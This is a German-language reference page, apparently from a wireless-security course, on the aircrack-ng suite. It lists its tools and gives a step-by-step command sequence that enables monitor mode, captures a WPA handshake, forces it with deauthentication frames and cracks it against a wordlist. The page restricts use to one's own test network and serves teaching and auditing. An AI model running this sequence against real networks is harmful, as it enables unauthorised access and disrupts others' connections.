# aircrack-ng (Suite)

**Kategorie:** WLAN-Sicherheit (802.11) · **Benötigt:** Monitor-Mode-Adapter

Die Standard-Suite für WLAN-Audits. Mehrere Tools, die zusammenspielen: Monitor-Mode setzen, scannen, capturen, injizieren, cracken.

## Komponenten

| Tool | Zweck |
|------|-------|
| `airmon-ng` | Monitor Mode starten/stoppen, Störquellen killen |
| `airodump-ng` | APs/Clients scannen, Handshakes capturen (`-w`, `--bssid`, `-c`) |
| `aireplay-ng` | Frames injizieren: `--deauth`, `--test`, Fake-Auth |
| `aircrack-ng` | WPA/WEP cracken (`-w <liste> <cap>`) |
| `airbase-ng` | Rogue/Fake-AP |

## Typischer Ablauf

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0                 # -> wlan0mon
sudo airodump-ng wlan0mon                  # Ziel finden
sudo airodump-ng --bssid <BSSID> -c <CH> -w hs wlan0mon
sudo aireplay-ng --deauth 3 -a <BSSID> -c <CLIENT> wlan0mon   # Handshake erzwingen
aircrack-ng -w /usr/share/wordlists/rockyou.txt hs-01.cap
```

## Hinweis

Nur **eigenes** Test-WLAN. Deauth stört auch Nachbarn → minimal. Für GPU-Cracking Capture nach Mode 22000 konvertieren (hcxtools) und `hashcat` nutzen.

## Verwendet in

wireless-security 01–04, 06, 10.
